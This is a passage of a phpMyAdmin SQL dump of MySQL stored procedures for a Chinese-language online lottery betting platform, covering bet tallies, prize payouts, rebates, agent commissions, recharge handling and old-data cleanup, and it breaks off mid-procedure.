-- phpMyAdmin SQL Dump
-- version phpStudy 2014
-- http://www.phpmyadmin.net
--
-- 主机: localhost
-- 生成日期: 2019 年 10 月 25 日 11:38
-- 服务器版本: 5.5.53
-- PHP 版本: 5.2.17

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `cs`
--

DELIMITER $$
--
-- 存储过程
--
CREATE DEFINER=`root`@`localhost` PROCEDURE `addScore`(_uid int, _amount float)
begin
	
	declare bonus float;
	select `value` into bonus from ssc_params where name='scoreProp' limit 1;
	
	set bonus=bonus*_amount;
	
	if bonus then
		update ssc_members u, ssc_params p set u.score = u.score+bonus, u.scoreTotal=u.scoreTotal+bonus where u.`uid`=_uid;
	end if;
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `auto_clearData`()
begin

	declare endDate int;
	set endDate = UNIX_TIMESTAMP(now())-7*24*3600;

	-- 采集记录
	delete from ssc_data where time < endDate;
	-- 会员登录session
	delete from ssc_member_session where accessTime < endDate;
	-- 投注
	delete from ssc_bets where kjTime < endDate and lotteryNo <> '';
	-- 管理员日志
	delete from ssc_admin_log where actionTime < endDate;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `betcount`(_date int(8), _type tinyint(3),_uid int(10))
begin
  -- 按彩种汇总表
	declare _pri int(11) DEFAULT 0; 
	declare _betCount int(5) DEFAULT 0;
	declare _betAmount double(15,4) DEFAULT 0.0000;
	declare _betAmountb double(15,4) DEFAULT 0.0000;
	declare _zjAmount double(15,4) DEFAULT 0.0000;
	declare _rebateMoney double(15,4) DEFAULT 0.0000;
	declare _username VARCHAR(16) DEFAULT null;
	declare _gudongId int(10) DEFAULT 0; 
	declare _zparentId int(10) DEFAULT 0; 
	declare _parentId int(10) DEFAULT 0; 

	select uid into _uid from ssc_members where isDelete=0 and `uid`=_uid;
	if _uid then

	select id into _pri from ssc_count where `date`=_date and `uid`=_uid and `type`=_type  LIMIT 1;

	if _pri=0 or _pri is null THEN
		insert into ssc_count (`date`, `uid`, `type`) values(_date, _uid, _type);
		select id into _pri from ssc_count where date=_date and `uid`=_uid and `type`=_type LIMIT 1;
	end if;

-- 统计有效方案数

	select count(*) into _betCount from ssc_bets where isDelete=0 and `uid`=_uid and `lotteryNo` !='' and `type` =_type and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
	
-- 统计总投注额,此处为复式投注总额
	select sum(totalMoney) into _betAmount from ssc_bets where isDelete=0 and `uid` =_uid and `lotteryNo` !='' and `type` =_type and `betInfo` !='' and `totalNums` >1 and `totalMoney` >0 and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
-- 此处为单式投注总额
	select sum(money) into _betAmountb from ssc_bets where isDelete=0 and `uid` =_uid and `lotteryNo` !='' and `type` =_type and `totalNums` =1 and `totalMoney` =0 and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;

-- 统计总中奖额
	select sum(bonus) into _zjAmount from ssc_bets where isDelete=0 and `uid` =_uid and `lotteryNo` !='' and `type` =_type and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
-- 统计总退水额
	select sum(rebateMoney) into _rebateMoney from ssc_bets where isDelete=0 and `uid` =_uid and `lotteryNo` !='' and `type` =_type and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
	-- 查询用户信息

	select username into _username from ssc_members where isDelete=0 and `uid` =_uid;
	select gudongId into _gudongId from ssc_members where isDelete=0 and `uid` =_uid;
	select zparentId into _zparentId from ssc_members where isDelete=0 and `uid` =_uid;	
	select parentId into _parentId from ssc_members where isDelete=0 and `uid` =_uid;
-- 对空值赋默认值，增强稳定性

	if _betCount is null THEN
		set _betCount = 0;
	end if;

	if _betAmount is null THEN
		set _betAmount = 0;
	end if;
	if _betAmountb is null THEN
		set _betAmountb = 0;
	end if;
	if _zjAmount is null THEN
		set _zjAmount = 0;
	end if;
	if _rebateMoney is null THEN
		set _rebateMoney = 0;
	end if;
	
	set _betAmount = _betAmount + _betAmountb;
-- 更新到数据库
	update ssc_count set betCount=_betCount, betAmount=_betAmount, zjAmount=_zjAmount, rebateMoney=_rebateMoney, username=_username, uid=_uid, gudongId=_gudongId, zparentId=_zparentId, parentId=_parentId where id=_pri;	

	end if;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `betreport`(_date int(8), _uid int(10))
begin
 -- 按日期汇总表
	declare _pri int(11) DEFAULT 0; 
	declare _betCount int(5) DEFAULT 0;
	declare _betAmount double(15,4) DEFAULT 0.0000;
	declare _betAmountb double(15,4) DEFAULT 0.0000;
	declare _zjAmount double(15,4) DEFAULT 0.0000;
	declare _rebateMoney double(15,4) DEFAULT 0.0000;
	declare _username VARCHAR(16) DEFAULT null;
	declare _gudongId int(10) DEFAULT 0; 
	declare _zparentId int(10) DEFAULT 0; 
	declare _parentId int(10) DEFAULT 0; 

	select uid into _uid from ssc_members where isDelete=0 and uid=_uid;
	if _uid then

	select id into _pri from ssc_report where date=_date and uid=_uid LIMIT 1;
	
	if _pri=0 or _pri is null THEN
		insert into ssc_report (date, uid) values(_date, _uid);
		select id into _pri from ssc_report where date=_date and uid=_uid LIMIT 1;
	end if;

-- 统计有效方案数

	select count(*) into _betCount from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
-- 统计总投注额,此处为复式投注总额
	select sum(totalMoney) into _betAmount from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and betInfo!='' and totalNums>1 and totalMoney>0 and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
-- 此处为单式投注总额
	select sum(money) into _betAmountb from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and totalNums=1 and totalMoney=0 and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
-- 统计总中奖额
	select sum(bonus) into _zjAmount from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
-- 统计总退水额
	select sum(rebateMoney) into _rebateMoney from ssc_bets where isDelete=0 and uid=_uid and lotteryNo!='' and FROM_UNIXTIME(kjTime,'%Y%m%d') = _date;
	-- 查询用户信息
	
	select username into _username from ssc_members where isDelete=0 and uid=_uid;
	select gudongId into _gudongId from ssc_members where isDelete=0 and uid=_uid;
	select zparentId into _zparentId from ssc_members where isDelete=0 and uid=_uid;	
	select parentId into _parentId from ssc_members where isDelete=0 and uid=_uid;
-- 对空值赋默认值，增强稳定性

	if _betCount is null THEN
		set _betCount = 0;
	end if;

	if _betAmount is null THEN
		set _betAmount = 0;
	end if;
	if _betAmountb is null THEN
		set _betAmountb = 0;
	end if;
	if _zjAmount is null THEN
		set _zjAmount = 0;
	end if;
	if _rebateMoney is null THEN
		set _rebateMoney = 0;
	end if;
	
	set _betAmount = _betAmount + _betAmountb;
-- 更新到数据库
	update ssc_report set betCount=_betCount, betAmount=_betAmount, zjAmount=_zjAmount, rebateMoney=_rebateMoney, username=_username, uid=_uid, gudongId=_gudongId, zparentId=_zparentId, parentId=_parentId where id=_pri;
	end if;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `cancelBet`(_zhuiHao varchar(255))
begin

	declare amount float;
	declare _uid int;
	declare _id int;
	declare _type int;
	
	declare info varchar(255) character set utf8;
	declare liqType int default 5;
	
	declare done int default 0;
	declare cur cursor for
	select id, money, `uid`, `type` from ssc_bets where serializeId=_zhuiHao and lotteryNo='' and isDelete=0;
	declare continue HANDLER for not found set done=1;
	
	open cur;
		repeat
			fetch cur into _id, amount, _uid, _type;
			if not done then
				update ssc_bets set isDelete=1 where id=_id;
				set info='追号撤单';
				call setCoin(amount, 0, _uid, liqType, _type, info, _id, '', '');
			end if;
		until done end repeat;
	close cur;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `clearData`(dateInt int(11))
begin

	declare endDate int;
	set endDate = dateInt;
	-- set endDate = unix_timestamp(dateString)+24*3600;

	-- 投注
	delete from ssc_bets where kjTime < endDate and lotteryNo <> '';
	-- select 1, _fanDian, _parentId;
	-- endDate=FROM_UNIXTIME(endDate,'%Y%m%d');
	delete from ssc_count where `date` < FROM_UNIXTIME(endDate,'%Y-%m-%d');
	delete from ssc_report where `date` < FROM_UNIXTIME(endDate,'%Y-%m-%d');
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `clearData2`(dateInt int(11))
begin

	declare endDate int;
	set endDate = dateInt;

	-- 采集记录
	delete from ssc_data where time < endDate;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `clearData3`(dateInt int(11))
begin

	declare endDate int;
	set endDate = dateInt;
	-- set endDate = unix_timestamp(dateString)+24*3600;
	-- 帐变
	delete from ssc_coin_log where actionTime < endDate;
		
	-- select 1, _fanDian, _parentId;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `clearData4`(dateInt int(11))
begin

	declare endDate int;
	set endDate = dateInt;
	-- set endDate = unix_timestamp(dateString)+24*3600;
	-- 管理员日志
	delete from ssc_admin_log where actionTime < endDate;
	-- select 1, _fanDian, _parentId;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `clearData5`(dateInt int(11))
begin

	declare endDate int;
	set endDate = dateInt;
	-- set endDate = unix_timestamp(dateString)+24*3600;
	-- 会员登录session
	delete from ssc_member_session where accessTime < endDate;
	-- select 1, _fanDian, _parentId;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `clearData6`(dateInt int(11))
begin

	declare endDate int;
	set endDate = dateInt;
	-- set endDate = unix_timestamp(dateString)+24*3600;
	-- 提现
	delete from ssc_member_cash where actionTime < endDate and state <> 1;
	-- select 1, _fanDian, _parentId;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `clearData7`(dateInt int(11))
begin

	declare endDate int;
	set endDate = dateInt;
	-- set endDate = unix_timestamp(dateString)+24*3600;
	-- 充值
	delete from ssc_member_recharge where actionTime < endDate and state <> 0;
	delete from ssc_member_recharge where actionTime < endDate-24*3600 and state = 0;
	-- select 1, _fanDian, _parentId;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `conComAll`(baseAmount float, parentAmount float, parentLevel int)
begin

	declare conUid int;
	declare conUserName varchar(255);
	declare tjAmount float;
	declare done int default 0;	
	declare dateTime int default unix_timestamp(curdate());

	declare cur cursor for
	select b.uid, b.username, sum(b.money) _tjAmount from ssc_bets b where b.kjTime>=dateTime and b.uid not in(select distinct l.extfield0 from ssc_coin_log l where l.liqType=53 and l.actionTime>=dateTime and l.extfield2=parentLevel) group by b.uid having _tjAmount>=baseAmount;
	declare continue HANDLER for not found set done=1;

	-- select baseAmount , parentAmount , parentLevel;
	
	open cur;
		repeat fetch cur into conUid, conUserName, tjAmount;
		-- select conUid, conUserName, tjAmount;
		if not done then
			call conComSingle(conUid, parentAmount, parentLevel);
		end if;
		until done end repeat;
	close cur;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `conComSingle`(conUid int, parentAmount float, parentLevel int)
begin

	declare parentId int;
	declare superParentId int;
	declare conUserName varchar(255) character set utf8;
	declare p_username varchar(255) character set utf8;

	declare liqType int default 53;
	declare info varchar(255) character set utf8;

	declare done int default 0;
	declare cur cursor for
	select p.uid, p.parentId, p.username, u.username from ssc_members p, ssc_members u where u.parentId=p.uid and u.`uid`=conUid; 
	declare continue HANDLER for not found set done=1;

	open cur;
		repeat fetch cur into parentId, superParentId, p_username, conUserName;
		-- select parentId, superParentId, p_username, conUserName, parentLevel;
		if not done then
			if parentLevel=1 then
				if parentId and parentAmount then
					set info=concat('下级[', conUserName, ']消费佣金');
					call setCoin(parentAmount, 0, parentId, liqType, 0, info, conUid, conUserName, parentLevel);
				end if;
			end if;
			
			if parentLevel=2 then
				if superParentId and parentAmount then
					set info=concat('下级[', conUserName, '<=', p_username, ']消费佣金');
					call setCoin(parentAmount, 0, superParentId, liqType, 0, info, conUid, conUserName, parentLevel);
				end if;
			end if;
		end if;
		until done end repeat;
	close cur;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `consumptionCommission`()
begin

	declare baseAmount float;
	declare baseAmount2 float;
	declare parentAmount float;
	declare superParentAmount float;

	call readConComSet(baseAmount, baseAmount2, parentAmount, superParentAmount);
	-- select baseAmount, baseAmount2, parentAmount, superParentAmount;

	if baseAmount>0 then
		call conComAll(baseAmount, parentAmount, 1);
	end if;
	if baseAmount2>0 then
		call conComAll(baseAmount2, superParentAmount, 2);
	end if;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `delUser`(_uid int)
begin
	-- 投注
	delete from ssc_bets where `uid`=_uid;
	-- 帐变
	delete from ssc_coin_log where `uid`=_uid;
	-- 管理员日志
	delete from ssc_admin_log where `uid`=_uid;
	-- 会员登录session
	delete from ssc_sysadmim_session where `uid`=_uid;
	-- 提现
	delete from ssc_member_cash where `uid`=_uid;
	-- 充值
	delete from ssc_member_recharge where `uid`=_uid;
	-- 银行
	delete from ssc_sysadmin_bank where `uid`=_uid;
	-- 用户
	delete from ssc_sysmember where `uid`=_uid;
	-- 推广链接
	delete from ssc_links where `uid`=_uid;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `delUser2`(_uid int)
begin
	-- 投注
	delete from ssc_bets where `uid`=_uid;
	-- 帐变
	delete from ssc_coin_log where `uid`=_uid;
	-- 管理员日志
	delete from ssc_admin_log where `uid`=_uid;
	-- 会员登录session
	delete from ssc_member_session where `uid`=_uid;
	-- 提现
	delete from ssc_member_cash where `uid`=_uid;
	-- 充值
	delete from ssc_member_recharge where `uid`=_uid;
	-- 银行
	delete from ssc_member_bank where `uid`=_uid;
	-- 用户
	delete from ssc_members where `uid`=_uid;
	-- 推广链接
	delete from ssc_links where `uid`=_uid;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `delUsers`(_coin float(10,2), _date int)
begin
	declare uid_del int;
	declare done int default 0;
	declare cur cursor for
	select distinct u.uid from ssc_members u, ssc_member_session s where u.uid=s.uid and u.coin<_coin and s.accessTime<_date and not exists(select u1.`uid` from ssc_members u1 where u1.parentId=u.`uid`)
union 
  select distinct u2.uid from ssc_members u2 where u2.coin<_coin and u2.regTime<_date and not exists (select s1.uid from ssc_member_session s1 where s1.uid=u2.uid);
	declare continue HANDLER for not found set done = 1;

	open cur;
		repeat
			fetch cur into uid_del;
			if not done then 
				call delUser(uid_del);
			end if;
		until done end repeat;
	close cur;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `getQzInfo`(_uid int, inout _fanDian float, inout _parentId int)
begin

	declare done int default 0;
	declare cur cursor for
	select fanDian, parentId from ssc_members where `uid`=_uid;
	declare continue HANDLER for not found set done = 1;

	open cur;
		fetch cur into _fanDian, _parentId;
	close cur;
	
	-- select 1, _fanDian, _parentId;
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `guestclear`()
begin

	declare endDate int;
	set endDate = UNIX_TIMESTAMP(now())-1*24*3600;

	-- 会员登录session
	delete from ssc_member_session where accessTime < endDate and username like 'guest_%';
	-- 投注
	delete from ssc_guestbets where kjTime < endDate;
	-- 帐变明细
	delete from ssc_guestcoin_log where actionTime < endDate;
	-- 临时会员
	delete from ssc_guestmembers where regTime < endDate;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `guestkanJiang`(_betId int, _zjCount int, _kjData varchar(255) character set utf8, _kset varchar(255) character set utf8)
begin
	
	declare `uid` int;									-- 抢庄人ID
	declare userid int;
	declare parentId int;								-- 投注人上级ID
	declare zparentId int;
	declare gudongId int;
	declare username varchar(32) character set utf8;	-- 投注人帐号
	-- 此函数为开奖派奖处理函数
	-- 投注
	declare serializeId varchar(64);
	declare actionData longtext character set utf8;
	declare actionNo varchar(255);
	declare `type` int;
	declare playedId int;
	
	declare isDelete int;
	declare odds float;     -- 赔率
	declare _rebate float default 0;
	declare _rebatemoney float default 0;
	declare fanDian float;		-- 返点
	
	declare amount float;					-- 投注总额
	declare zjAmount float default 0;		-- 中奖总额
	declare _fanDianAmount float default 0;	-- 总返点的钱
	
	declare liqType int;
	declare info varchar(255) character set utf8;
	
	declare _parentId int;		-- 处理上级时返回
	declare _zparentId int;		-- 处理上级时返回
	declare _gudongId int;		-- 处理上级时返回
	declare _fanDian float;		-- 用户返点
	
	declare totalnums SMALLINT default 0;
	declare totalmoney float default 0;
	declare betinfo varchar(64) character set utf8;
	declare Groupname varchar(32) character set utf8;
	
	declare _kjTime int(11) DEFAULT 0;
	-- 提取投注信息
	declare done int default 0;
	declare cur cursor for
	select b.`uid`, u.parentId, u.zparentId, u.gudongId, u.username, b.serializeId, b.actionData, b.actionNo, FROM_UNIXTIME(b.kjTime,'%Y%m%d') _kjTime, b.`type`, b.playedId, b.isDelete, b.fanDian, u.fanDian, b.odds, b.rebate, b.money, b.totalNums, b.totalMoney, b.betInfo, b.Groupname  from ssc_guestbets b, ssc_guestmembers u where b.`uid`=u.`uid` and b.id=_betId;
	declare continue handler for sqlstate '02000' set done = 1;
	
	open cur;
		repeat
			fetch cur into `uid`, parentId, zparentId, gudongId, username, serializeId, actionData, actionNo, _kjTime, `type`, playedId, isDelete, fanDian, _fanDian, odds, _rebate, amount, totalnums, totalmoney, betinfo, Groupname;
		until done end repeat;
	close cur;
	-- 开始事务
	start transaction;
	if md5(_kset)='47df5dd3fc251a6115761119c90b964a' then
	
		-- 已撤单处理，不进行处理
		if isDelete=0 then
		
			set userid=`uid`;
			-- 处理上级返点
			set _parentId=parentId;
			set _zparentId=zparentId;
			set _gudongId=gudongId;
			-- set _fanDian=fanDian;
			set fanDian=_fanDian;
			-- select _fanDian , fanDian, _fanDianAmount;
			-- 处理奖金
			if _zjCount then
				-- 中奖处理
				
				set liqType=6;
				set info='中奖奖金';
				if _zjCount = -1 then
					if totalnums>1 and totalmoney>0 and betinfo<>'' then
						set amount=totalmoney;
					end if;
					set zjAmount= amount; -- 和局退回投注金额
				elseif Groupname='三军' then
					set zjAmount= amount * odds + amount * (_zjCount - 1); -- 单注金额*赔率
				else
					set zjAmount= _zjCount * amount * odds; -- 中奖注数*单注金额*赔率
				end if;
				call guestsetCoin(zjAmount, 0, `uid`, liqType, `type`, info, _betId, serializeId, '');
				
			end if;	
	
			if _zjCount = -1 then
				set _zjCount = 0;
			end if;				
			-- 判断是否复选投注
			if totalnums>1 and totalmoney>0 and betinfo<>'' then
				set amount=totalmoney;
			end if;

			-- 处理退水
			if _rebate>0 and  _rebate<0.5 THEN
			set liqType=105;
			set info='退水资金';
			set _rebatemoney = amount * _rebate;
			call guestsetCoin(_rebatemoney, 0, `uid`, liqType, `type`, info, _betId, serializeId, '');
			end if;

			update ssc_guestbets set lotteryNo=_kjData, zjCount=_zjCount, bonus=zjAmount, rebateMoney=_rebatemoney where id=_betId;

			if CONVERT(DATE_FORMAT(now(),'%H%i'), SIGNED)>=100 and CONVERT(DATE_FORMAT(now(),'%H%i'), SIGNED)<105 then
			call guestclear();
			end if;
		end if;
	end if;
	-- 提交事务
	commit;
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `guestsetCoin`(_coin float, _fcoin float, _uid int, _liqType int, _type int, _info varchar(255) character set utf8, _extfield0 int, _extfield1 varchar(255) character set utf8, _extfield2 varchar(255) character set utf8)
begin
	
	-- 当前时间
	DECLARE currentTime INT DEFAULT UNIX_TIMESTAMP();
	DECLARE _userCoin FLOAT;
	DECLARE _count INT  DEFAULT 0;
	-- select _coin, _fcoin, _liqType, _info;
	IF _coin IS NULL THEN
		SET _coin=0;
	END IF;
	IF _fcoin IS NULL THEN
		SET _fcoin=0;
	END IF;
	-- 更新用户表
	SELECT COUNT(1) INTO _count FROM ssc_guestcoin_log WHERE  extfield0=_extfield0  AND info='中奖奖金'  AND `uid`=_uid;
	IF  _count<1 THEN
	UPDATE ssc_guestmembers SET coin = coin + _coin, fcoin = fcoin + _fcoin WHERE `uid` = _uid;
	SELECT coin INTO _userCoin FROM ssc_guestmembers WHERE `uid`=_uid;
	-- 添加资金流动日志
	INSERT INTO ssc_guestcoin_log(coin, fcoin, userCoin, `uid`, actionTime, liqType, `type`, info, extfield0, extfield1, extfield2) VALUES(_coin, _fcoin, _userCoin, _uid, currentTime, _liqType, _type, _info, _extfield0, _extfield1, _extfield2);
	END IF;
	-- select coin, fcoin from ssc_members where `uid`=_uid;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `isFirstRechargeCom`(_uid int, OUT flag int)
begin
	
	declare dateTime int default unix_timestamp(curdate());
	select id into flag from ssc_member_recharge where rechargeTime>dateTime and `uid`=_uid;
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `kanJiang`(_betId int, _zjCount int, _kjData varchar(255) character set utf8, _kset varchar(255) character set utf8)
begin
	
	declare `uid` int;									-- 抢庄人ID
	declare userid int;
	declare parentId int;								-- 投注人上级ID
	declare zparentId int;
	declare gudongId int;
	declare username varchar(32) character set utf8;	-- 投注人帐号
	-- 此函数为开奖派奖处理函数
	-- 投注
	declare serializeId varchar(64);
	declare actionData longtext character set utf8;
	declare actionNo varchar(255);
	declare `type` int;
	declare playedId int;
	
	declare isDelete int;
	declare odds float;     -- 赔率
	declare _rebate float default 0;
	declare _rebatemoney float default 0;
	declare fanDian float;		-- 返点
	
	declare amount float;					-- 投注总额
	declare zjAmount float default 0;		-- 中奖总额
	declare _fanDianAmount float default 0;	-- 总返点的钱
	
	declare liqType int;
	declare info varchar(255) character set utf8;
	
	declare _parentId int;		-- 处理上级时返回
	declare _zparentId int;		-- 处理上级时返回
	declare _gudongId int;		-- 处理上级时返回
	declare _fanDian float;		-- 用户返点
	
	declare totalnums SMALLINT default 0;
	declare totalmoney float default 0;
	declare betinfo varchar(64) character set utf8;
	declare Groupname varchar(32) character set utf8;
	declare _kjTime int(11) DEFAULT 0;
	-- 提取投注信息
	declare done int default 0;
	declare cur cursor for
	select b.`uid`, u.parentId, u.zparentId, u.gudongId, u.username, b.serializeId, b.actionData, b.actionNo, FROM_UNIXTIME(b.kjTime,'%Y%m%d') _kjTime, b.`type`, b.playedId, b.isDelete, b.fanDian, u.fanDian, b.odds, b.rebate, b.money, b.totalNums, b.totalMoney, b.betInfo, b.Groupname  from ssc_bets b, ssc_members u where b.`uid`=u.`uid` and b.id=_betId;
	declare continue handler for sqlstate '02000' set done = 1;
	
	open cur;
		repeat
			fetch cur into `uid`, parentId, zparentId, gudongId, username, serializeId, actionData, actionNo, _kjTime, `type`, playedId, isDelete, fanDian, _fanDian, odds, _rebate, amount, totalnums, totalmoney, betinfo, Groupname;
		until done end repeat;
	close cur;
	
	-- select `uid`, parentId, username, qz_uid, qz_username, qz_fcoin, serializeId, actionData, actionNo, `type`, playedId, isDelete, fanDian, _fanDian, `mode`, beiShu, zhuiHao, zhuiHaoMode, bonusProp, amount;

	-- 开始事务
	start transaction;
	if md5(_kset)='47df5dd3fc251a6115761119c90b964a' then
	
		-- 已撤单处理，不进行处理
		if isDelete=0 then
			
			-- 处理积分
			-- call addScore(`uid`, amount);
		
			-- 处理自己返点备用
			-- if fanDian then
				-- set liqType=2;
				-- set info='返点';
				-- set _fanDianAmount=amount * fanDian/1000;
				-- call setCoin(_fanDianAmount, 0, `uid`, liqType, `type`, info, _betId, '', '');
			-- end if;
			set userid=`uid`;
			-- 处理上级返点
			set _parentId=parentId;
			set _zparentId=zparentId;
			set _gudongId=gudongId;
			-- set _fanDian=fanDian;
			set fanDian=_fanDian;
			-- select _fanDian , fanDian, _fanDianAmount;
			-- 处理奖金
			if _zjCount then
				-- 中奖处理
				
				set liqType=6;
				set info='中奖奖金';
				if _zjCount = -1 then
					if totalnums>1 and totalmoney>0 and betinfo<>'' then
						set amount=totalmoney;
					end if;
					set zjAmount= amount; -- 和局退回投注金额
				elseif Groupname='三军' then
					set zjAmount= amount * odds + amount * (_zjCount - 1); -- 单注金额*赔率
				else
					set zjAmount= _zjCount * amount * odds; -- 中奖注数*单注金额*赔率
				end if;
				call setCoin(zjAmount, 0, `uid`, liqType, `type`, info, _betId, serializeId, '');
				
			end if;	
	
			if _zjCount = -1 then
				set _zjCount = 0;
			end if;			
			-- 判断是否复选投注
			if totalnums>1 and totalmoney>0 and betinfo<>'' then
				set amount=totalmoney;
			end if;

			-- if _zjCount=0 then	
				-- 未中奖处理
				-- if _parentId >0 then
				-- call setDLFanDian(amount, _fanDian, _parentId,  `type`, _betId, userid, username);
				-- end if;
				-- if _zparentId >0 then
				-- call setZDLFanDian(amount, _fanDian, _zparentId,  `type`, _betId, userid, username);
				-- end if;
				-- if _gudongId >0 then
				-- call setGDFanDian(amount, _fanDian, _gudongId,  `type`, _betId, userid, username);
				-- end if;	
			-- end if;	

			-- 处理退水
			if _rebate>0 and  _rebate<0.5 THEN
			set liqType=105;
			set info='退水资金';
			set _rebatemoney = amount * _rebate;
			call setCoin(_rebatemoney, 0, `uid`, liqType, `type`, info, _betId, serializeId, '');
			end if;
			-- if _parentId >0 or _zparentId >0 or _gudongId >0 then
			-- set _fanDianAmount = _fanDianAmount + amount * fanDian/100;
			-- end if;
			-- 更新开奖数据
			update ssc_bets set lotteryNo=_kjData, zjCount=_zjCount, bonus=zjAmount, rebateMoney=_rebatemoney where id=_betId;

			if _kjTime then				
				 call betcount(_kjTime, `type`, userid);
				 call betreport(_kjTime, userid);
			end if;

			-- 处理追号
			-- if _zjCount and zhuiHao=1 and zhuiHaoMode=1 then
				-- 如果是追号单子
				-- 并且中奖时停止追号的单子
				-- 给后续单子撤单
				-- call cancelBet(serializeId);
			-- end if;
		end if;
	end if;
	-- 提交事务
	commit;
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `pro_count`(_date varchar(20))
begin
	
	declare fromTime int;
	declare toTime int;
	
	if not _date then
		set _date=date_add(curdate(), interval -1 day);
	end if;
	
	set toTime=unix_timestamp(_date);
	set fromTime=toTime-24*3600;
	
	insert into ssc_count(`type`, playedId, `date`, betCount, betAmount, zjAmount)
	select `type`, playedId, _date, sum(money), sum(bonus) from ssc_bets where kjTime between fromTime and toTime and isDelete=0 group by type, playedId
	on duplicate key update betCount=values(betCount), betAmount=values(betAmount), zjAmount=values(zjAmount);


end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `pro_pay`()
begin

	declare _m_id int;					-- 充值ID
	declare _addmoney float(10,2);		-- 充值金额
	declare _h_fee float(10,2);		-- 手续费
	declare _rechargeTime varchar(20);	-- 充值时间
	declare _rechargeId varchar(64);		-- 订单号
	declare _info varchar(64) character set utf8;	-- 充值方式字符串
	
	declare _uid int;
	declare _coin float;
	declare _fcoin float;
	
	declare _r_id int;
	declare _amount float;
	
	declare currentTime int default unix_timestamp();
	declare _liqType int default 1;
	declare info varchar(64) character set utf8 default '自动到账';
	declare done int default 0;
	
	declare isFirstRecharge int;
	
	declare cur cursor for
	select m.id, m.addmoney, m.h_fee, m.o_time, m.u_id, m.memo,		u.`uid`, u.coin, u.fcoin,		r.id, r.amount from ssc_members u, my18_pay m, ssc_member_recharge r where u.`uid`=r.`uid` and r.rechargeId=m.u_id and m.`state`=0 and r.`state`=0 and r.isDelete=0;
	declare continue HANDLER for not found set done = 1;

	start transaction;
		open cur;
			repeat
				fetch cur into _m_id, _addmoney, _h_fee, _rechargeTime, _rechargeId, _info, _uid, _coin, _fcoin, _r_id, _amount;
				
				if not done then
					-- select _r_id;
					-- if _amount=_addmoney then
						call setCoin(_addmoney, 0, _uid, _liqType, 0, info, _r_id, _rechargeId, '');
						if _h_fee>0 then
							call setCoin(_h_fee, 0, _uid, _liqType, 0, '充值手续费', _r_id, _rechargeId, '');
						end if;
						update ssc_member_recharge set rechargeAmount=_addmoney+_h_fee, coin=_coin, fcoin=_fcoin, rechargeTime=currentTime, `state`=2, `info`=info where id=_r_id;
						update my18_pay set `state`=1 where id=_m_id;
						
						-- 每天首次充值上家赠送充值佣金
						call isFirstRechargeCom(_uid, isFirstRecharge);
						if isFirstRecharge then
							call setRechargeCom(_addmoney, _uid, _r_id, _rechargeId);
						end if;
					-- else
						-- update my18_pay set `state`=2 where id=_m_id;
					-- end if;
				end if;
				
			until done end repeat;
		close cur;
	commit;
	
	
end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `readConComSet`(OUT baseAmount float, OUT baseAmount2 float, OUT parentAmount float, OUT superParentAmount float)
begin

	declare _name varchar(255);
	declare _value varchar(255);
	declare done int default 0;

	declare cur cursor for
	select name, `value` from ssc_params where name in('conCommissionBase', 'conCommissionBase2', 'conCommissionParentAmount', 'conCommissionParentAmount2');
	declare continue HANDLER for not found set done=1;

	open cur;
		repeat fetch cur into _name, _value;
			case _name
			when 'conCommissionBase' then
				set baseAmount=_value-0;
			when 'conCommissionBase2' then
				set baseAmount2=_value-0;
			when 'conCommissionParentAmount' then
				set parentAmount=_value-0;
			when 'conCommissionParentAmount2' then
				set superParentAmount=_value-0;
			end case;
		until done end repeat;
	close cur;

end$$

CREATE DEFINER=`root`@`localhost` PROCEDURE `readRechargeComSet`(OUT baseAmount float, OUT parentAmount float, OUT superParentAmount float)
begin

	declare _name varchar(255);
	declare _value varchar(255);
	declare done int default 0;

	declare cur cursor for
	select name, `value` from ssc_params where name in('rechargeCommissionAmount', 'rechargeCommission', 'rechargeCommission2');
	declare continue HANDLER for not found set done=1;

	open cur;
		repeat fetch cur into _name, _value;
			case _name
			when 'rechargeCommissionAmount' then
				set baseAmount=_value-0;
			when 'rechargeCommission' then
